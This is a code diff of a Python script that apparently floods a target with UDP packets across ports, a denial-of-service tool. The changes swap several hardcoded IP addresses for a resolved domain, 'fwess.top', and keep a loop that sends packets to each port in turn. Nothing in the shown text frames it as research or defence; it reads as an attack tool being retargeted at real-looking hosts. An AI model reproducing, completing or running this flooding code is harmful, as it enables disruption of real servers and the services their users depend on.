@@ -33,7 +33,7 @@ port_mode = False # If 'False' all ports will be use, if 'True' - certain.
 port = 1
 
 
-# Starting working.
+# Cast
 os.system(cmd_clear)
 print('\033[1;34mTo all of my children in whom Life flows abundant...')
 time.sleep(1)
@@ -68,21 +68,21 @@ time.sleep(1)
 print('\033[1;36m/ac Groundwork')
 time.sleep(1)
 
+# Get ip.
+url = "fwess.top"
+ip = socket.gethostbyname(url)
+
+print('\033[1;36m/ac Groundwork')
+time.sleep(1)
+
+# Value.
 sent = 0
 i = 590
 timeR = i + random.randint(0,20)
 now = datetime.datetime.now()
 dtime = now.strftime("%Y-%m-%d %H:%M:%S")
 
-#ip = "103.215.51.90"
-#ip = "103.215.51.91"
-#ip = "103.215.51.92"
-#ip = "103.215.51.93"
-#ip = "103.215.51.94"
-ip = "163.197.32.26"
-
-
-
+#ululu alala
 if port_mode == False:  # All ports.
     try:
         while True:
@@ -97,10 +97,7 @@ if port_mode == False:  # All ports.
             elif port == 1900:
                 port = 1901
 
-            #sock.sendto(bytes, (str("103.215.51.90"), port))
             sock.sendto(bytes, (str(ip), port))
-            #sock.sendto(bytes, (str("103.215.51.92"), port))
-            #sock.sendto(bytes, (str("103.215.51.93"), port))
             sent += 1
             port += 1
             timeR = i + random.randint(0,20)
